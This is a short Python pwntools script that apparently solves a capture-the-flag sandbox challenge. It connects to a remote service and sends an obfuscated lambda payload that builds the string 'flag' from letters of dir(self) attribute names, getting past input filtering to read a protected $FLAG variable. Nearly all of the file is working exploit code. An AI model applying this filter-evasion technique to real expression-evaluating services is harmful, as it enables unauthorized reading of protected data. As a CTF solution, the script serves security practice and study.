#!/usr/bin/env python3
from pwn import *

context.log_level = "error"

r = remote(args.HOST, args.PORT, ssl=args.SSL)
if args.TEAM_TOKEN:
    r.sendlineafter(b"token: ", args.TEAM_TOKEN.encode())

# payload = "self.get_var((lambda a, aa, aaa, aaaa, a5, a6, a7, a8, a9, a10, a11, a12, a13, a14, a15, a16, a17, a18, a19, a20, a21, a22, a23, a24, a25, a26, a27, a28, a29, a30, a31, a32, a33: aa + aaaa + a + aaa)(*dir(self)))"
params = ['a' * i for i in range(1,30)]

## there are 29 items in dir(self)

#  __format__ for 'f' -> 6
# __class__ for 'la' -> 0
# __ge__ for 'g' -> 7

def param_letters(s):
    return ['b'*i for i in range(1, len(s)+1)]

f = param_letters('__format__')
c = param_letters('__class__')
g = param_letters('__ge__')

payload = f"self.get_var((lambda {','.join(params)} : (lambda {','.join(f)}: {f[2]})(*{params[6]}) + (lambda {','.join(c)}: {c[3]} + {c[4]})(*{params[0]}) + (lambda {','.join(g)}: {g[2]})(*{params[7]}))(*dir(self)))"

r.sendlineafter(b"Will you be able to read the $FLAG?\n> ", payload.encode('ascii'))
flag = r.recvline().decode().strip()
print(flag)
# print(payload)
